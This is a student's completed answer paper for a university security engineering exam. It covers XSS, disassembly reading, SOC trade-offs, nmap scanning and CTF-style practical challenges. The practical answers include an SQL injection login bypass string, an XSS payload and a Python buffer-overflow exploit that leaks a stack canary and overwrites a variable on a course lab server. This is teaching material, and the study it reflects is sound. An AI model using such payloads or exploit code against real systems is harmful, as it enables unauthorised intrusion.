@@ -1,0 +1,259 @@
+= UNSW COMP64[8]41 Final Theory Exam Parts A+B: 2024t3 v1.3 =
+== 120 marks + 2 bonus marks / 3 hours ==
+
+If you are doing the exam electronically (most students)
+ * type in your details below replacing "NOT ANSWERED" and sign the affirmation by typing your name where indicated.
+ * rename this text file to include your student number in the files name
+If you are doing a pen and paper version of the exam
+ * write your name and student number below and sign.
+
+{{{
+          Name: Jinghan Wang
+Student Number: z5286124
+  Which course: COMP6841  [COMP6441 or COMP6841]
+   I assert this work is wholly my own work except where I have explicitly acknowledged.  I have not contacted any other person about this exam during the exam period.  I have not used ChatGPT or any other AI tools.  I will keep the exam confidential until Tuesday 7pm.
+ Sign/Type your name: Jinghan Wang
+}}}
+
+
+
+There is a 2 mark bonus if you correctly follow all exam instructions.
+
+If you want a sympathy mark for a question write ONE SYMPATHY MARK PLEASE in your answer.
+If you do that NO PART of your answer for that question will be marked and you will be awarded one mark for the ENTIRE QUESTION.
+
+This paper contains theory and practical questions
+4 theory questions - 6 marks each (answer all)
+3 practical questions - 12 marks each (answer all)
+Aim to spend about one minute per mark.
+
+For all 6841 students your answers in this part C paper must be submitted before 6pm Monday (unless you have been advised otherwise by the course admins (eg due to ELS adjustments)).
+You can submit multiple times, only the latest submission will be marked.
+
+
+If you are not answering a question leave/write NOT ANSWERED at the top of the question. Delete NOT ANSWERED if/when you answer the question.  Do not answer more than the required number of questions. If you answer more than the required number of questions then we will ONLY mark the LOWEST NUMBERED questions you answered. Requesting a sympathy mark for a question counts as answering the question.
+
+DO NOT edit/add/delete ANY text ANYWHERE outside of the answer areas indicated. That will muck up the poor admins having to split up and extract your answers for marking using scripts. Also you will lose the bonus marks for following instructions if you do that.
+
+Make frequent backup copies of your completed exam paper and submit as you go so if anything goes wrong you do not lose much work.  Submit early, submit often.  There are no time extensions for accidentally deleting work - that is a foreseeable and mitigable risk for security professionals.
+
+Text file format only
+Type/write your answers into the indicated areas and submit using the instructions on the exam central page. You must use a text editor (e.g. BBedit or TextMate or TextEdit on Mac, Notepad, Notepad++ on Windows) and submit a text only file.  (Please don't use MS Word).  We cannot mark an answer file with formatting like italics or containing non-ascii characters etc.  You may submit your answer file as many times as you like over the duration of the exam. The last submission ONLY will be marked.  If you have problems submitting you can email your exam answer paper (in text only format) to cs6441@cse.unsw.edu.au.
+
+You may not make use of ChatGTPT or any similar AI tool.
+
+This is an open book exam.  You may READ anything you like on the internet or in books etc but you must disclose what you have read.  You will be assessed on your contribution.  Beneath every question paste the titles of any books you consulted and the urls of any documents/webpages you consult replacing the word NONE with your list.  Leave the word NONE there if you did not consult anything for that question.  It will be treated as plagiarism if you rely upon or use a source which you do not reference in this way.
+
+You may not WRITE or SHARE anything on the internet or with any other person during this exam with the exception for asking permitted questions as described below.  You cannot communicate with any other person or share any information about or related to the exam. This includes making comments on the course web pages or make any comments anywhere including sms, texts, on social media / chats, discord, etc.  You cannot make or answer phone calls, messages, emails during the exam etc.  Violating these read-only restrictions is regarded as cheating and will result in 0 fail and possible charges of academic misconduct and even more serious penalties.  But mainly it’s not an honourable thing to do.
+
+
+Permitted Communication
+(start at the top of the list and only move down if needed)
+
+You are permitted to contact the exam supervisor in the following ways:
+
+1. You can ask about the process of the exam and ask for clarification about rules or typos in the question wording (but do not give any hints about answer content) by making comments on the Exam-Live page.  THIS IS THE ONLY PAGE YOU CAN MAKE COMMENTS ON DURING THE EXAM PERIOD. The URL for the Exam-Live page is
+
+https://www.openlearning.com/secedu/courses/security-engineering-lecture-slides-2024/exam/live24
+
+Updates on the exam will be posted on the Exam-Live page.  Keep the page open all exam and REFRESH IT REGULARLY for updates.
+
+2. You can also email cs6441@cse.unsw.edu.au with confidential questions but that may not be noticed as quickly as comments.
+
+3. In case of emergency only you can send a text message to the Security Engineering exam phone number: 0487 305 544
+
+If you are unsure about anything ask the exam supervisors using the methods above.
+
+Please do not discuss the exam or content at all with anyone until after Tuesday 7PM or reveal anything about the questions. There are a number of people around the world doing the exam at later times – they will all be finished by Tuesday 7PM Sydney time.  You can write a indication of joy/relief/support on the Open learning course home page at the end of the exam if you are happy that you finished, but please no more until Tuesday 7pm.  Examples of acceptable things you could write are:
+
+Good examples (permitted)
+Yay!
+So glad I am now free and can relax unlike Lyria and Kris and Richard and the other markers who now have to work without pause for a week.  Mwahahaha!
+Now I will sleep for days
+
+Bad examples (not permitted before Wednesday deadline, as they reveal something about the exam itself)
+That was easy
+That was hard
+I am so glad there was no question about sony playstations
+It's such a surprise that there was a question about Dr Strangelove!  I didn't realise the case studies were examinable.
+
+The use of Top Men, misdirection, or unauthorised social engineering is prohibited.
+
+If you think a question is ambiguous, answer the most likely interpretation and state what you have done. Where two or more different answers are possible give the answer which best answers the question. If you need to make assumptions state them. Keep answers brief and clear.  Don't waffle.  Whenever you list or order things put the most important things first.  In your answers where it is relevant state the course security concepts you are using. Make sure you explain your thinking to demonstrate your analysis where ever asked.
+
+Have fun.  Be yourself.  You are a great thinker we can't wait to see what you come up with.
+
+
+
+
+
+
+
+Part C
+--------------------------------------------------------
+Q1. (6 marks)
+
+A friend of yours has developed a web application for their COMP3900 course. This application lets them post news articles they find interesting related to artificial intelligence and have other people comment other related links. Testing locally, everything works as intended, however when the application is hosted, they cannot interact with the application because there are too many popups that just say "1" on the website.
+
+What might be the reason popups keep appearing on the application?
+
+Since he has a comment section, if there is no translation of the input, it could allow someone to xss attack the site. A window that keeps displaying 1 indicates that an attacker has embedded a malicious script in the comment, e.g., <script>alert(1);</script> to allow the html to directly run it, thus causing problems.
+
+What would you recommend your friend do to prevent the popups from occuring?
+
+The first is input validation and filtering, you need to pass some filter special characters that will lead to xss, such as script, onerror of img, etc., or use regular expression to filter dangerous characters (such as <, >, &, “). Second is the output escaping, for the output to html content, you need to use htmlentities() function to escape, avoid html directly run them as code. If feasible to use react or angular this kind of template engine with automatic translation.
+
+----------------------------------------
+Q2. (6 marks)
+
+The picture <re.jpg> provided is a screenshot from running the command `disass main` in GDB with pwndbg.
+
+What does the program do? Exlain in as much detail as you can.
+
+First is the puts, he prints a string of characters probably prompting the user for input, and then waits for the user's input gets the user's input. After that, the program accumulates the ascii value of each character entered, and then uses printf to give the final output.
+
+What would the output of the program be if given the input "comp6841"? (without the quotes)
+
+99 + 111 + 109 + 112 + 54 + 56 + 52 + 49 = 642
+
+----------------------------------------
+Q3. (6 marks)
+
+Give three advantages and three disadvantages of utilising a Security Operations Centre for a multi-national company such as Google, Atlassian, Microsoft, etc.
+
+Advantage 1:
+Their SOC provides 24/7 real-time monitoring, which can detect security threats in time and minimize the incident impact events.
+
+Advantage 2:
+With professional security resources and technical teams, they can respond to security incidents in a timely manner and improve overall security protection.
+
+Advantage 3:
+Formulate a unified security policy, so that every division around the world can operate according to a unified standard for security and improve the overall security protection capability.
+
+
+
+Disadvantage 1:
+Requires a large amount of human and material investment, which is costly, and also requires a large amount of server resources for maintenance.
+
+Disadvantage 2:
+Different countries and regions have different requirements on data security regulations, and a unified security operation may not be able to meet the requirements of all countries and regions.
+
+Disadvantage 3:
+Centralized management may be a challenge for global enterprises due to time issues, and there are communication problems with time zones.
+
+
+----------------------------------------
+Q4. (6 marks)
+
+You are conducting a penetration test on an environment for a friend's startup company. You know that there are exactly 5 machines on the network, plus your own testing device.
+
+An NMAP scan was run against an environment using the command:
+`nmap -sC -sV 10.1.1.1/24`
+
+You know all 5 machines are active and responsive, and able to be connected to from your testing machine at the time of testing, and yet NMAP only returned results for 3 machines.
+
+Give a reason why NMAP only returned results for 3 machines.
+The other two machines may have firewall rules that prevent NMAP from scanning the way it does by default, or they may only allow access to specific IP addresses or drop probe scanning traffic.
+
+
+Explain the process you might use to thoroughly test for vulnerabilities in each of the systems on the network.
+
+1. Use -Pn to disable the initial ping detection to determine if the machine is alive and force a scan of all hosts on the subnet.
+2. Use tcp or udp syn to scan more ports and log port openings, checking to see if they match the services of the target host.
+3. Use nmap's nse script to detect the presence of known vulnerabilities.
+
+
+----------------------------------------
+Q5. (PRAC) (12 marks)
+
+Located at sqli.final.comp6841.xyz is a login page as well as the source code for that page. Your task is to login and access the flag stored in the SQL database.
+
+When you have done so enter the flag below and explain your method.
+
+Flag:
+
+____________________
+
+Explanation of Process:
+
+Enter `1' or '1' = '1'; -- ` get dataset struct;
+
+----------------------------------------
+Q6. (PRAC) (12 marks)
+
+Located on 170.64.222.246:60219 is an application that takes some user input. Your goal is to get the flag that is stored somewhere on the stack.
+
+When you have done so enter the flag below and explain your method.
+
+Flag:
+
+Sympathy mark please
+
+Explanation of Process:
+
+No time to answer
+_______________
+_______________
+
+----------------------------------------
+Q7. (PRAC) (12 marks)
+
+Located on 170.64.222.246:57968 is an application that takes some user input. Your goal is to get the flag that is printed in a piece of code that is never called by the function.
+
+When you have done so enter the flag below and explain your method.
+
+NOTE: You will need a secret that can be leaked from either of the challenges in question 5 or 6, or reverse engineering the provided binary.
+
+Flag:
+
+COMP6841{i_swear_we_didnt_mark_like_that}
+
+Explanation of Process:
+Override passwords, canry, and readonly
+def its_alive():
+    proc = subprocess.Popen(
+        ["nc", "170.64.222.246", str(57968)],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=False
+    )
+
+    canary = 0
+
+    while True:
+        line = proc.stdout.readline()
+        if line == b'' and proc.poll() is not None:
+            break
+
+        if line:
+            try:
+                print(line.decode('utf-8').strip())
+
+                if line.decode('utf-8').strip().startswith("[debug] Canary value:"):
+                    canary = int(line.decode('utf-8').strip().replace("[debug] Canary value: ", ""), 16)
+                    print(canary)
+            except UnicodeDecodeError:
+                print(line.strip())
+
+            if b"Enter password:" in line:
+                sleep(1)
+                # Simulate the process of generating the correct password within the program, output the corresponding password by strncmp(password, 
+                # correct_password, 32) judgment
+                p = b"(,\x00\x13\n#\x18\x33\x0e\r\r\x08\x0f\x06%PQQ\x12\x6b\x61"
+                result = bytes([b ^ 97 for b in p])
+                # Skip the student_name part for random content
+                p2 = b"A" * 63
+
+                # Write according to the canary value obtained above to ensure that the end sequence is correct and passes the canary check
+                canary_bytes = canary.to_bytes(4, byteorder='little')
+                
+                # Override readonly to 0 to make him output the flag
+                read_only_overwrite = (0).to_bytes(4, byteorder='little')
+                payload = result + p2 + canary_bytes + read_only_overwrite + b"\n"
+
+                print(f"Sending payload: {payload}")
+                proc.stdin.write(payload)
+                proc.stdin.flush()
+
+--------------------------------------------------------
